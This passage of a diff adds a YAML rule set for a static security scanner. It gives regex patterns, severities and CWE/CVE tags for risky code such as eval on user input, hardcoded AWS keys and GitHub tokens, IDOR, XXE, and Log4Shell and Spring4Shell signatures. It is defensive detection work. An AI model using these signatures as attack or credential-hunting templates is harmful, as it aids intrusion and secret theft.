+      description: "Hardcoded authentication flag"
+      severity: "CRITICAL"
+      cwe: "CWE-287"
+
+  # ---------------------------------------------------------------------------
+  # CWE-94: Code Injection
+  # ---------------------------------------------------------------------------
+  code_injection:
+    - name: "eval with user input"
+      pattern: '\beval\s*\([^)]*(?:req|request|params|input|user|body)'
+      description: "eval() with user input"
+      severity: "CRITICAL"
+      cwe: "CWE-94"
+
+    - name: "new Function"
+      pattern: 'new\s+Function\s*\([^)]*(?:req|request|params|input|user)'
+      description: "Function constructor with user input"
+      severity: "CRITICAL"
+      cwe: "CWE-94"
+
+    - name: "vm.runInContext"
+      pattern: 'vm\.(?:runIn|compile|createContext)'
+      description: "Node.js VM execution"
+      severity: "HIGH"
+      cwe: "CWE-94"
+
+  # ---------------------------------------------------------------------------
+  # CWE-862: Missing Authorization
+  # ---------------------------------------------------------------------------
+  missing_auth:
+    - name: "Unprotected route"
+      pattern: 'app\.(?:get|post|put|delete|patch)\s*\([^)]*(?:admin|user|private|internal)[^)]*,\s*(?:function|async|\()'
+      description: "Potentially unprotected sensitive route"
+      severity: "MEDIUM"
+      cwe: "CWE-862"
+
+    - name: "Direct object reference"
+      pattern: '(?:findById|findOne|getById)\s*\([^)]*(?:req\.params|req\.query|req\.body)'
+      description: "Direct object reference from user input"
+      severity: "MEDIUM"
+      cwe: "CWE-862"
+
+  # ---------------------------------------------------------------------------
+  # CWE-434: Unrestricted File Upload
+  # ---------------------------------------------------------------------------
+  file_upload:
+    - name: "File extension validation"
+      pattern: '(?:\.jpg|\.png|\.gif|\.pdf)(?:\s*\|\||\s*,)'
+      description: "Client-side file extension check"
+      severity: "LOW"
+      cwe: "CWE-434"
+
+    - name: "MIME type check bypass"
+      pattern: 'mimetype|content-type.*(?:image|application)'
+      description: "MIME type validation (may be bypassable)"
+      severity: "INFO"
+      cwe: "CWE-434"
+
+    - name: "File upload without validation"
+      pattern: '(?:multer|formidable|busboy)\s*\(['
+      description: "File upload middleware"
+      severity: "INFO"
+      cwe: "CWE-434"
+
+  # ---------------------------------------------------------------------------
+  # CWE-798: Hardcoded Credentials
+  # ---------------------------------------------------------------------------
+  hardcoded_creds:
+    - name: "AWS credentials"
+      pattern: 'AKIA[0-9A-Z]{16}'
+      description: "AWS Access Key ID"
+      severity: "CRITICAL"
+      cwe: "CWE-798"
+
+    - name: "Private key"
+      pattern: '-----BEGIN\s+(?:RSA\s+)?PRIVATE\s+KEY-----'
+      description: "Private key in code"
+      severity: "CRITICAL"
+      cwe: "CWE-798"
+
+    - name: "GitHub token"
+      pattern: 'gh[pousr]_[A-Za-z0-9_]{36,}'
+      description: "GitHub personal access token"
+      severity: "CRITICAL"
+      cwe: "CWE-798"
+
+    - name: "JWT secret"
+      pattern: 'jwt\.sign\s*\([^)]*["\'][^"\']{8,}["\']'
+      description: "Hardcoded JWT secret"
+      severity: "HIGH"
+      cwe: "CWE-798"
+
+  # ---------------------------------------------------------------------------
+  # CWE-200: Information Exposure
+  # ---------------------------------------------------------------------------
+  info_exposure:
+    - name: "Stack trace exposure"
+      pattern: '(?:console\.(?:log|error)|print)\s*\([^)]*(?:err|error|exception|stack)'
+      description: "Error/stack trace logging"
+      severity: "LOW"
+      cwe: "CWE-200"
+
+    - name: "Debug mode enabled"
+      pattern: '(?:debug|DEBUG)\s*[:=]\s*(?:true|1|["\'])'
+      description: "Debug mode enabled"
+      severity: "LOW"
+      cwe: "CWE-200"
+
+    - name: "Verbose error messages"
+      pattern: 'res\.(?:send|json)\s*\([^)]*(?:error|err|exception|message)'
+      description: "Error details in response"
+      severity: "LOW"
+      cwe: "CWE-200"
+
+  # ---------------------------------------------------------------------------
+  # CWE-306: Missing Authentication for Critical Function
+  # ---------------------------------------------------------------------------
+  missing_auth_critical:
+    - name: "Unprotected API endpoint"
+      pattern: 'app\.(?:post|put|delete)\s*\(["\'][^"\']*(?:admin|user|account|password|payment|transfer)'
+      description: "Critical endpoint may lack authentication"
+      severity: "HIGH"
+      cwe: "CWE-306"
+
+  # ---------------------------------------------------------------------------
+  # CWE-269: Improper Privilege Management
+  # ---------------------------------------------------------------------------
+  privilege_escalation:
+    - name: "Role assignment"
+      pattern: '(?:role|admin|privilege)\s*[:=]\s*(?:req|request|params|input|user)'
+      description: "Role/privilege from user input"
+      severity: "HIGH"
+      cwe: "CWE-269"
+
+    - name: "Admin flag"
+      pattern: 'isAdmin\s*[:=]\s*(?:req|request|params|body)'
+      description: "Admin flag from user input"
+      severity: "CRITICAL"
+      cwe: "CWE-269"
+
+  # ---------------------------------------------------------------------------
+  # CWE-400: Resource Exhaustion / DoS
+  # ---------------------------------------------------------------------------
+  resource_exhaustion:
+    - name: "Regex DoS"
+      pattern: 'new\s+RegExp\s*\([^)]*(?:\+|\*|\{)'
+      description: "Dynamic regex construction"
+      severity: "MEDIUM"
+      cwe: "CWE-400"
+
+    - name: "Unbounded loop"
+      pattern: 'while\s*\(\s*true\s*\)'
+      description: "Potentially infinite loop"
+      severity: "MEDIUM"
+      cwe: "CWE-400"
+
+    - name: "Large allocation"
+      pattern: 'new\s+Array\s*\(\s*(?:req|request|params|input)'
+      description: "Array size from user input"
+      severity: "MEDIUM"
+      cwe: "CWE-400"
+
+  # ---------------------------------------------------------------------------
+  # CWE-601: URL Redirection to Untrusted Site
+  # ---------------------------------------------------------------------------
+  open_redirect:
+    - name: "Redirect with user input"
+      pattern: '(?:redirect|location\.href|window\.location)\s*[:=]\s*(?:req|request|params|url|next|return)'
+      description: "Redirect with user-controlled URL"
+      severity: "MEDIUM"
+      cwe: "CWE-601"
+
+    - name: "Header location"
+      pattern: 'res\.(?:redirect|setHeader\s*\(["\']location)'
+      description: "HTTP redirect"
+      severity: "INFO"
+      cwe: "CWE-601"
+
+  # ---------------------------------------------------------------------------
+  # CWE-611: XXE (XML External Entity)
+  # ---------------------------------------------------------------------------
+  xxe:
+    - name: "XML parsing"
+      pattern: '(?:parseXML|DOMParser|xml2js|fast-xml-parser)\s*\('
+      description: "XML parsing (check for XXE protection)"
+      severity: "MEDIUM"
+      cwe: "CWE-611"
+
+    - name: "DOCTYPE in XML"
+      pattern: '<!DOCTYPE[^>]*SYSTEM|<!ENTITY'
+      description: "External entity declaration"
+      severity: "HIGH"
+      cwe: "CWE-611"
+
+  # ---------------------------------------------------------------------------
+  # CWE-125/CWE-787: Buffer Issues (Out-of-bounds Read/Write)
+  # ---------------------------------------------------------------------------
+  buffer_issues:
+    - name: "Buffer allocation"
+      pattern: 'Buffer\.(?:alloc|from|allocUnsafe)\s*\([^)]*(?:req|request|params|input|size)'
+      description: "Buffer with user-controlled size"
+      severity: "MEDIUM"
+      cwe: "CWE-787"
+
+    - name: "Slice with user input"
+      pattern: '\.(?:slice|substring|substr)\s*\([^)]*(?:req|request|params|input)'
+      description: "String/array slice with user input"
+      severity: "LOW"
+      cwe: "CWE-125"
+
+  # ---------------------------------------------------------------------------
+  # CWE-863: Incorrect Authorization
+  # ---------------------------------------------------------------------------
+  incorrect_auth:
+    - name: "Role check bypass"
+      pattern: '(?:role|user\.type)\s*(?:==|===|!=|!==)\s*["\'](?:admin|user)["\']'
+      description: "Simple role comparison"
+      severity: "MEDIUM"
+      cwe: "CWE-863"
+
+    - name: "IDOR pattern"
+      pattern: '(?:findById|getById|deleteById)\s*\((?:req\.params\.id|req\.query\.id)'
+      description: "Direct object reference without authorization check"
+      severity: "HIGH"
+      cwe: "CWE-863"
+
+# ============================================================================
+# CVE REFERENCE PATTERNS
+# ============================================================================
+# Patterns for detecting known CVE-vulnerable code patterns
+cve_patterns:
+  - name: "Log4j JNDI"
+    pattern: '\$\{(?:jndi|env|sys|java|lower|upper):'
+    description: "Log4Shell (CVE-2021-44228) pattern"
+    severity: "CRITICAL"
+    cve: "CVE-2021-44228"
+
+  - name: "Spring4Shell"
+    pattern: 'class\.module\.classLoader'
+    description: "Spring4Shell (CVE-2022-22965) pattern"
+    severity: "CRITICAL"
+    cve: "CVE-2022-22965"
+
+  - name: "Lodash prototype pollution"
+    pattern: '__proto__|constructor\[|prototype\['
+    description: "Prototype pollution pattern"
+    severity: "HIGH"
+    cve: "CVE-2020-8203"
+
+  - name: "jQuery XSS"
+    pattern: '\$\s*\(\s*["\'][^"\']*<'
+    description: "jQuery selector XSS (CVE-2020-11022)"
+    severity: "MEDIUM"
+    cve: "CVE-2020-11022"
